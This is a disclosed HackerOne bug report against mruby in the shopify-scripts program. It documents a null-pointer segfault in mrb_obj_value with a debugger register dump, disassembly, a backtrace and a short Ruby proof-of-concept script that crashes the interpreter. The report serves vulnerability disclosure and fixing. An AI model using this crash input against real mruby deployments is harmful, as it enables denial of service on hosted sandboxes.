# SIGSEGV - mrb_obj_value

## Report Details
- **Report ID**: 213779
- **URL**: https://hackerone.com/reports/213779
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-15T20:35:55.658Z
- **Disclosed**: 2017-04-19T07:40:02.815Z

## Reporter
- **Username**: icanthack
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Linux Ubuntu Xenial 64
commit f8b31a0db671b71d2794ce866b87596a09c10bf0
Author: Yukihiro "Matz" Matsumoto <matz@ruby-lang.org>
Date:   Wed Mar 15 09:00:03 2017 +0900

output
```
RAX: 0x0 
RBX: 0x6c4e80 --> 0x1 
RCX: 0x6c4e50 --> 0x6b4320 --> 0x112 
RDX: 0xf222f69400000003 
RSI: 0x6b4320 --> 0x112 
RDI: 0x0 
RBP: 0x7fffffffdb10 --> 0x7fffffffe1d0 --> 0x7fffffffe220 --> 0x7fffffffe280 --> 0x7fffffffe410 --> 0x7fffffffe440 (--> ...)
RSP: 0x7fffffffdaf0 --> 0x6bc8d0 --> 0x9109 
RIP: 0x417da4 (<mrb_obj_value+16>:	movzx  eax,BYTE PTR [rax])
R8 : 0x3 
R9 : 0x7fffffffe1d0 --> 0x7fffffffe220 --> 0x7fffffffe280 --> 0x7fffffffe410 --> 0x7fffffffe440 --> 0x7fffffffe500 (--> ...)
R10: 0x12 
R11: 0x7ffff7899390 --> 0xfffda380fffda0af 
R12: 0x0 
R13: 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x417d98 <mrb_obj_value+4>:	sub    rsp,0x20
   0x417d9c <mrb_obj_value+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x417da0 <mrb_obj_value+12>:	mov    rax,QWORD PTR [rbp-0x18]
=> 0x417da4 <mrb_obj_value+16>:	movzx  eax,BYTE PTR [rax]
   0x417da7 <mrb_obj_value+19>:	movzx  eax,al
   0x417daa <mrb_obj_value+22>:	mov    DWORD PTR [rbp-0x8],eax
   0x417dad <mrb_obj_value+25>:	mov    rax,QWORD PTR [rbp-0x18]
   0x417db1 <mrb_obj_value+29>:	mov    QWORD PTR [rbp-0x10],rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdaf0 --> 0x6bc8d0 --> 0x9109 
0008| 0x7fffffffdaf8 --> 0x0 
0016| 0x7fffffffdb00 --> 0x1 
0024| 0x7fffffffdb08 --> 0x2 
0032| 0x7fffffffdb10 --> 0x7fffffffe1d0 --> 0x7fffffffe220 --> 0x7fffffffe280 --> 0x7fffffffe410 --> 0x7fffffffe440 (--> ...)
0040| 0x7fffffffdb18 --> 0x41b658 (<mrb_vm_exec+4559>:	mov    QWORD PTR [rbp-0x2e0],rax)
0048| 0x7fffffffdb20 --> 0x6b20e8 --> 0x6fc830 --> 0x708800 --> 0x1 
0056| 0x7fffffffdb28 --> 0x71bba4 --> 0x24000980181001b 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000417da4 in mrb_obj_value (p=0x0) at /home/ubuntu/mruby/include/mruby/value.h:212
212	  SET_OBJ_VALUE(v, (struct RBasic*)p);
```


backtrace
```
#0  0x0000000000417da4 in mrb_obj_value (p=0x0) at /home/ubuntu/mruby/include/mruby/value.h:212
#1  0x000000000041b658 in mrb_vm_exec (mrb=0x6b2010, proc=0x6b4d40, pc=0x71bba4)
    at /home/ubuntu/mruby/src/vm.c:1096
#2  0x000000000041a487 in mrb_vm_run (mrb=0x6b2010, proc=0x6b4d40, self=..., stack_keep=0x0)
    at /home/ubuntu/mruby/src/vm.c:820
#3  0x000000000042291f in mrb_top_run (mrb=0x6b2010, proc=0x6b4d40, self=..., stack_keep=0x0)
    at /home/ubuntu/mruby/src/vm.c:2615
#4  0x000000000044925b in mrb_load_exec (mrb=0x6b2010, p=0x70eda0, c=0x70da00)
    at /home/ubuntu/mruby/mrbgems/mruby-compiler/core/parse.y:5760
#5  0x00000000004492f1 in mrb_load_file_cxt (mrb=0x6b2010, f=0x70e9f0, c=0x70da00)
    at /home/ubuntu/mruby/mrbgems/mruby-compiler/core/parse.y:5769
#6  0x00000000004022f0 in main (argc=0x2, argv=0x7fffffffe5e8)
    at /home/ubuntu/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227
#7  0x00007ffff7725830 in __libc_start_main (main=0x401fd6 <main>, argc=0x2, argv=0x7fffffffe5e8, 
    init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffe5d8) at ../csu/libc-start.c:291
#8  0x00000000004019b9 in _start ()

```

PoC
```
begin
rescue => a
end

begin
  b
rescue begin
    c ""
  rescue => d
    0
  ensure
  end
end
```

## Attachments
No attachments
